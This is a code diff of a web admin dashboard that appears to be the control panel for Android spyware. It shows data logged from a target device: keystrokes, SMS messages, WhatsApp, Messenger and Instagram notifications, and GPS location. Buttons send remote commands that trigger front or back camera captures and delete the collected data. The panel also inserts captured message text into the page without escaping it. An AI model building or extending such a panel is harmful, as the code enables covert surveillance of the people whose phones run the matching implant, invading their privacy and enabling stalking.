+            if (message && selectedUserInfo.userId && selectedUserInfo.childKey) {
+                push(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`), { message: message, timestamp: serverTimestamp(), read: false })
+                    .then(() => { alert('Notification sent successfully!'); closeModal(notificationModal); })
+                    .catch(error => { alert('Failed to send notification: ' + error.message); });
+            }
+        });
+
+        // --- Data Rendering ---
         function displayCategoryData(category) {
-            if (activeDataListener) { activeDataListener(); activeDataListener = null; }
+            document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
+            const currentBtn = document.querySelector(`.category-btn[data-category="${category}"]`);
+            if (currentBtn) currentBtn.classList.add('active');
+            
+            // Detach any PREVIOUS modal listener before attaching a new one.
+            if (activeDataListener) { off(activeDataListener.ref, 'value', activeDataListener.callback); activeDataListener = null; }
+            
+            const modalDataDisplayArea = document.getElementById('modal-data-display-area');
             modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
+            
             const { userId, childKey } = selectedUserInfo;
-            if (!userId || !childKey) return;
-
-            // --- Modified to handle photo and chat ---
-            if (category === 'photo') {
-                renderPhotosFromStorage(userId, childKey);
+            if (!userId || !childKey) {
+                modalDataDisplayArea.innerHTML = '<p>Please select a user first.</p>';
                 return;
             }
-             if (category === 'chat') {
-                renderChat(userId, childKey);
+            
+            document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
+
+            if (category === 'photo') { 
+                renderPhotosFromStorage(userId, childKey); 
+                return; 
+            }
+            if (category === 'chat') { 
+                renderChat(userId, childKey); 
                 return;
             }
-
+            
             const dataPath = `user/${userId}/${childKey}/${getCategoryPath(category)}`;
             const dataRef = ref(db, dataPath);
-            activeDataListener = onValue(dataRef, (snapshot) => {
-                try {
-                    const data = snapshot.val();
-                    renderData(category, data);
-                } catch (error) {
-                    console.error("Data rendering error:", error);
-                    modalDataDisplayArea.innerHTML = `<p>Error displaying data.</p>`;
+            const callback = (snapshot) => { renderData(category, snapshot.val()); };
+            
+            // Attach the new listener for real-time data and store it.
+            onValue(dataRef, callback);
+            activeDataListener = { ref: dataRef, callback: callback };
+        }
+
+        function renderChat(userId, childKey) {
+            const chatButton = document.querySelector('.category-btn[data-category="chat"]');
+            if (chatButton) {
+                const mainIndicator = chatButton.querySelector('.chat-notification-indicator');
+                if(mainIndicator) mainIndicator.remove();
+            }
+            
+            const activeUserItem = document.querySelector(`.user-list-item[data-userid="${userId}"][data-childkey="${childKey}"]`);
+            if(activeUserItem) {
+                const sidebarIndicator = activeUserItem.querySelector('.sidebar-indicator');
+                if(sidebarIndicator) sidebarIndicator.remove();
+            }
+
+            const modalDataDisplayArea = document.getElementById('modal-data-display-area');
+            modalDataDisplayArea.innerHTML = `<div class="live-chat-area"><div class="chat-messages" id="chat-messages-area"><div class="loader"></div></div><div class="chat-input-area"><input type="text" id="chat-message-input" placeholder="Type a message..."><button id="chat-send-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></button></div></div>`;
+            
+            const chatMessagesArea = document.getElementById('chat-messages-area');
+            const chatMessageInput = document.getElementById('chat-message-input');
+            const chatSendBtn = document.getElementById('chat-send-btn');
+            const chatPath = `chats/${userId}/${childKey}/messages`;
+            const chatRef = ref(db, chatPath);
+
+            const callback = (snapshot) => {
+                const messages = snapshot.val();
+                if (messages) {
+                    chatMessagesArea.innerHTML = ''; // Clear loader
+                    const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
+                    sortedKeys.forEach(key => {
+                        const message = messages[key];
+                        const bubble = document.createElement('div');
+                        bubble.classList.add('chat-bubble', message.sender);
+                        const time = message.timestamp ? new Date(message.timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }) : '';
+                        bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
+                        chatMessagesArea.prepend(bubble);
+                    });
+                } else {
+                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet.</p>';
                 }
-            });
+            };
+            onValue(chatRef, callback);
+            activeDataListener = { ref: chatRef, callback: callback };
+
+            const sendMessage = () => {
+                const messageText = chatMessageInput.value.trim();
+                if (messageText) {
+                    push(ref(db, chatPath), { text: messageText, sender: 'admin', timestamp: serverTimestamp() });
+                    chatMessageInput.value = '';
+                }
+            };
+            chatSendBtn.addEventListener('click', sendMessage);
+            chatMessageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
         }
         
-        // --- All existing rendering functions (renderPhotos, getCategoryPath, renderData) remain the same ---
+        function renderData(category, data) {
+            const modalDataDisplayArea = document.getElementById('modal-data-display-area');
+            let headerHTML = '';
+            let contentHTML = '';
+            const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
+            if (category !== 'location' && hasData) {
+                headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
+            }
+            if (!hasData) {
+                contentHTML = '<p>No data available in this category.</p>';
+            } else {
+                 switch(category) {
+                    case 'location':
+                        let mapLink = '';
+                        if (data.latitude && data.longitude) {
+                             mapLink = `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                        }
+                        contentHTML = `<div class="location-card" style="font-size: 1.1rem; line-height: 1.8;">
+                                        <div style="display:flex; align-items:flex-start; gap:1rem; margin-bottom: 1.5rem;">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+                                            <div><strong>Address:</strong><br>${data.address || 'N/A'}</div>
+                                        </div>
+                                        <div style="display:flex; align-items:flex-start; gap:1rem;">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                                            <div><strong>Time:</strong><br>${data.dateTime || 'N/A'}</div>
+                                        </div>
+                                        ${mapLink}
+                                    </div>`;
+                        break;
+                    case 'keylogger':
+                         contentHTML = '<div class="keylog-list">';
+                         Object.values(data).reverse().forEach(log => {
+                             if (log && log.keyText) {
+                                 const parts = log.keyText.split(' |');
+                                 const time = parts[0] || '';
+                                 const action = (parts[1] || 'Action').replace(/[()]/g, '');
+                                 const text = parts[2] || 'N/A';
+                                 contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
+                             }
+                         });
+                         contentHTML += '</div>';
+                         break;
+                    case 'sms':
+                        contentHTML = '<div class="sms-card-list">';
+                        Object.values(data).reverse().forEach(sms => {
+                            if (sms) {
+                                const isOutgoing = sms.type === 2;
+                                const cardClass = isOutgoing ? 'outgoing' : 'incoming';
+                                const icon = isOutgoing ? `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="17" y1="7" x2="7" y2="17"></line><polyline points="17 17 7 17 7 7"></polyline></svg>` : `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
+                                const addressLabel = isOutgoing ? 'To:' : 'From:';
+                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${addressLabel} ${sms.smsAddress || 'N/A'}</div></div><div class="sms-card-body">${sms.smsBody || ''}</div><div class="sms-card-footer">${sms.dateTime || ''}</div></div>`;
+                            }
+                        });
+                        contentHTML += '</div>';
+                        break;
+                    case 'notifications':
+                         contentHTML = '<div class="notification-list">';
+                         Object.values(data).reverse().forEach(notif => {
+                             if (notif) {
+                                 let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
+                                 const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
+                                 if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; }
+                                 contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
+                             }
+                         });
+                         contentHTML += '</div>';
+                         break;
+                 }
+            }
+            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
+        }
+        
         async function renderPhotosFromStorage(userId, childKey) {
-            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="0"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="1"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
+            const modalDataDisplayArea = document.getElementById('modal-data-display-area');
+            const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
             modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
             try {
                 const photoDirRef = storageRef(storage, `user/${userId}/${childKey}/photo`);
                 const res = await listAll(photoDirRef);
-                if (res.items.length === 0) {
-                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
-                    return;
-                }
-                
+                if (res.items.length === 0) { modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>'; return; }
                 const photoPromises = res.items.map(itemRef => Promise.all([getDownloadURL(itemRef), getMetadata(itemRef)]));
                 const photosWithData = await Promise.all(photoPromises);
-
                 let photoGridHTML = '<div class="photo-grid">';
                 photosWithData.sort((a, b) => new Date(b[1].timeCreated) - new Date(a[1].timeCreated)).forEach(([url, metadata]) => {
                     const timeCreated = new Date(metadata.timeCreated).toLocaleString('en-US');
@@ -772,11 +934,58 @@
                 });
                 photoGridHTML += '</div>';
                 modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
-            } catch (error) {
-                console.error("Error fetching photos:", error);
-                modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`;
-            }
+            } catch (error) { console.error("Error fetching photos:", error); modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. (Error Code: ${error.code})</p>`; }
         }
+
+        // THE FIX: This entire event listener block was missing and has been restored.
+        // It handles clicks for all buttons inside the data modal.
+        modalDataDisplayArea.addEventListener('click', (e) => {
+            const button = e.target.closest('button');
+            if (!button) return;
+            const { userId, childKey, userName } = selectedUserInfo;
+            
+            // Logic for the 'Clear Data' button
+            if (button.classList.contains('clear-category-btn')) {
+                const category = button.dataset.category;
+                if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'?`)) {
+                    if (category === 'photo') { 
+                        clearAllPhotos(userId, childKey); 
+                    } else { 
+                        remove(ref(db, `user/${userId}/${childKey}/${getCategoryPath(category)}`)); 
+                    }
+                }
+            }
+            
+            // Logic for the 'Capture Photo' buttons
+            if (button.classList.contains('capture-photo-btn')) {
+                const facing = button.dataset.facing; // facing '1' for front, '0' for back
+                if (facing === undefined) return;
+                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`);
+                const span = button.querySelector('span');
+                const originalText = span.textContent;
+                button.disabled = true; span.textContent = 'Sending...';
+                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
+                    .then(() => { 
+                        span.textContent = 'Command Sent!'; 
+                        setTimeout(() => { 
+                            span.textContent = originalText; 
+                            button.disabled = false; 
+                        }, 3000); 
+                    })
+                    .catch((error) => { 
+                        console.error("Error sending command: ", error); 
+                        alert("Failed to send command. Please try again."); 
+                        span.textContent = originalText; 
+                        button.disabled = false; 
+                    });
+            }
+
+            // Logic for the 'Refresh' button
+            if (button.id === 'refresh-photos-btn') { 
+                displayCategoryData('photo'); 
+            }
+        });
+
         function getCategoryPath(category) {
             switch(category) {
                 case 'location': return 'location/data';
@@ -787,210 +996,11 @@
                 default: return '';
             }
         }
-        function renderData(category, data) {
-            let headerHTML = '';
-            let contentHTML = '';
-            const hasData = data && typeof data === 'object' && Object.keys(data).length > 0;
-            
-            if (category !== 'location' && hasData) {
-                headerHTML = `<div class="data-header"><button class="clear-category-btn" data-category="${category}"><span>Clear ${category} Data</span></button></div>`;
-            }
-
-            if (!hasData) {
-                contentHTML = '<p>No data available in this category.</p>';
-            } else {
-                 switch(category) {
-                     case 'location':
-                         let mapLink = '';
-                         if (data.latitude && data.longitude) {
-                             mapLink = `<a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
-                         }
-                         contentHTML = `<div class="location-card"><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div class="location-item-content"><strong>Address</strong><span>${data.address || 'N/A'}</span></div></div><div class="location-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div class="location-item-content"><strong>Time</strong><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
-                         break;
-                     case 'keylogger':
-                         contentHTML = '<div class="keylog-list">';
-                         Object.values(data).reverse().forEach(log => {
-                             if (log && log.keyText) {
-                                 const parts = log.keyText.split(' |');
-                                 const time = parts[0] || '';
-                                 const action = (parts[1] || 'Action').replace(/[()]/g, '');
-                                 const text = parts[2] || 'N/A';
-                                 contentHTML += `
-                                     <div class="keylog-card">
-                                         <div class="keylog-header">
-                                             <div class="keylog-icon">
-                                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
-                                             </div>
-                                             <strong class="keylog-action">${action}</strong>
-                                         </div>
-                                         <p class="keylog-text">${text}</p>
-                                         <div class="keylog-footer">${time}</div>
-                                     </div>`;
-                             }
-                         });
-                         contentHTML += '</div>';
-                         break;
-                     case 'sms':
-                        // --- EDITED SMS CODE ---
-                        contentHTML = '<div class="sms-card-list">';
-                        Object.values(data).reverse().forEach(sms => {
-                            if (sms) {
-                                const isOutgoing = sms.type === 2;
-                                const cardClass = isOutgoing ? 'outgoing' : 'incoming';
-                                const icon = isOutgoing ?
-                                    `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="17" y1="7" x2="7" y2="17"></line><polyline points="17 17 7 17 7 7"></polyline></svg>` :
-                                    `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
-                                const addressLabel = isOutgoing ? 'To:' : 'From:';
-                                contentHTML += `
-                                    <div class="sms-card ${cardClass}">
-                                        <div class="sms-card-header">
-                                            <div class="sms-card-icon">${icon}</div>
-                                            <div class="sms-card-address">${addressLabel} ${sms.smsAddress || 'N/A'}</div>
-                                        </div>
-                                        <div class="sms-card-body">${sms.smsBody || ''}</div>
-                                        <div class="sms-card-footer">${sms.dateTime || ''}</div>
-                                    </div>
-                                `;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
-                     case 'notifications':
-                         contentHTML = '<div class="notification-list">';
-                         Object.values(data).reverse().forEach(notif => {
-                             if (notif) {
-                                 let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
-                                 const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
-                                 if (fullText.includes('whatsapp')) {
-                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
-                                 } else if (fullText.includes('messenger')) {
-                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
-                                 } else if (fullText.includes('instagram')) {
-                                     appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
-                                 }
-                                 contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
-                             }
-                         });
-                         contentHTML += '</div>';
-                         break;
-                 }
-            }
-            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
-        }
-
-        // --- NEW CHAT RENDER FUNCTION ---
-        function renderChat(userId, childKey) {
-            modalTitle.textContent = `Live Chat with ${selectedUserInfo.userName}`;
-            modalDataDisplayArea.innerHTML = `
-                <div class="live-chat-area">
-                    <div class="chat-messages" id="chat-messages-area">
-                        <div class="loader"></div>
-                    </div>
-                    <div class="chat-input-area">
-                        <input type="text" id="chat-message-input" placeholder="Type a message...">
-                        <button id="chat-send-btn">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
-                        </button>
-                    </div>
-                </div>
-            `;
-
-            const chatMessagesArea = document.getElementById('chat-messages-area');
-            const chatMessageInput = document.getElementById('chat-message-input');
-            const chatSendBtn = document.getElementById('chat-send-btn');
-            
-            const chatPath = `chats/${userId}/${childKey}/messages`;
-            const chatRef = ref(db, chatPath);
-
-            activeDataListener = onValue(chatRef, (snapshot) => {
-                chatMessagesArea.innerHTML = '';
-                const messages = snapshot.val();
-                if (messages) {
-                    const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
-                    sortedKeys.forEach(key => {
-                        const message = messages[key];
-                        const bubble = document.createElement('div');
-                        bubble.classList.add('chat-bubble', message.sender);
-                        const time = message.timestamp ? new Date(message.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '';
-                        bubble.innerHTML = `${message.text}<span class="chat-time">${time}</span>`;
-                        chatMessagesArea.prepend(bubble);
-                    });
-                } else {
-                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet. Start the conversation!</p>';
-                }
-            });
-
-            const sendMessage = () => {
-                const messageText = chatMessageInput.value.trim();
-                if (messageText) {
-                    const messagesRef = ref(db, `chats/${userId}/${childKey}/messages`);
-                    push(messagesRef, {
-                        text: messageText,
-                        sender: 'admin',
-                        timestamp: serverTimestamp()
-                    });
-                    chatMessageInput.value = '';
-                }
-            };
-
-            chatSendBtn.addEventListener('click', sendMessage);
-            chatMessageInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    sendMessage();
-                }
-            });
-        }
         
-        // --- Existing Event Listener on Data Area ---
-        modalDataDisplayArea.addEventListener('click', (e) => {
-            const button = e.target.closest('button');
-            if (!button) return;
-            const { userId, childKey, userName } = selectedUserInfo;
-            if (button.classList.contains('clear-category-btn')) {
-                const category = button.dataset.category;
-                if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'?`)) {
-                    if (category === 'photo') {
-                        clearAllPhotos(userId, childKey);
-                    } else {
-                        remove(ref(db, `user/${userId}/${childKey}/${getCategoryPath(category)}`));
-                    }
-                }
-            }
-            if (button.classList.contains('capture-photo-btn')) {
-                const facing = button.dataset.facing;
-                if (facing === undefined) return;
-
-                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`);
-                
-                const span = button.querySelector('span');
-                const originalText = span.textContent;
-                button.disabled = true;
-                span.textContent = 'Sending...';
-
-                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
-                    .then(() => {
-                        span.textContent = 'Command Sent!';
-                        setTimeout(() => {
-                            span.textContent = originalText;
-                            button.disabled = false;
-                        }, 3000);
-                    })
-                    .catch((error) => {
-                        console.error("Error sending command: ", error);
-                        alert("Failed to send command. Please try again.");
-                        span.textContent = originalText;
-                        button.disabled = false;
-                    });
-            }
-            if (button.id === 'refresh-photos-btn') { 
-                displayCategoryData('photo'); 
-            }
-        });
-        
-        // --- All existing functions (clearAllPhotos, menu toggles) remain the same ---
         async function clearAllPhotos(userId, childKey) {
             const photoStoragePath = `user/${userId}/${childKey}/photo`;
             if (!confirm(`Are you sure you want to delete all photos for '${selectedUserInfo.userName}'? This cannot be undone.`)) return;
+            const modalDataDisplayArea = document.getElementById('modal-data-display-area');
             modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photos...</p>';
             try {
                 const photoDirRef = storageRef(storage, photoStoragePath);
@@ -999,59 +1009,8 @@
                 await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
                 alert('All photos have been deleted.');
                 displayCategoryData('photo');
-            } catch (error) {
-                console.error("Error clearing photos:", error);
-                alert("Error clearing photos.");
-                displayCategoryData('photo');
-            }
+            } catch (error) { console.error("Error clearing photos:", error); alert("Error clearing photos."); displayCategoryData('photo'); }
         }
-        
-        menuBtn.addEventListener('click', () => sidebar.classList.add('open'));
-        overlay.addEventListener('click', () => sidebar.classList.remove('open'));
-        modalCloseBtn.addEventListener('click', () => {
-            if (activeDataListener) { activeDataListener(); activeDataListener = null; }
-            dataModal.style.display = 'none';
-        });
-
-        // --- NEW Notification Modal Logic ---
-        sendNotificationBtn.addEventListener('click', () => {
-            if (selectedUserInfo.userId) {
-                document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
-                notificationMessageInput.value = '';
-                notificationModal.style.display = 'flex';
-            } else {
-                alert('Please select a user first.');
-            }
-        });
-
-        sendNotificationSubmitBtn.addEventListener('click', () => {
-            const message = notificationMessageInput.value.trim();
-            if (message && selectedUserInfo.userId && selectedUserInfo.childKey) {
-                const notificationPath = `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`;
-                const notificationsRef = ref(db, notificationPath);
-                push(notificationsRef, {
-                    message: message,
-                    timestamp: serverTimestamp(),
-                    read: false
-                }).then(() => {
-                    alert('Notification sent successfully!');
-                    notificationModal.style.display = 'none';
-                }).catch(error => {
-                    alert('Failed to send notification: ' + error.message);
-                });
-            }
-        });
-
-        // Close modal buttons
-        document.querySelectorAll('.modal-close-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                const modalId = btn.dataset.target;
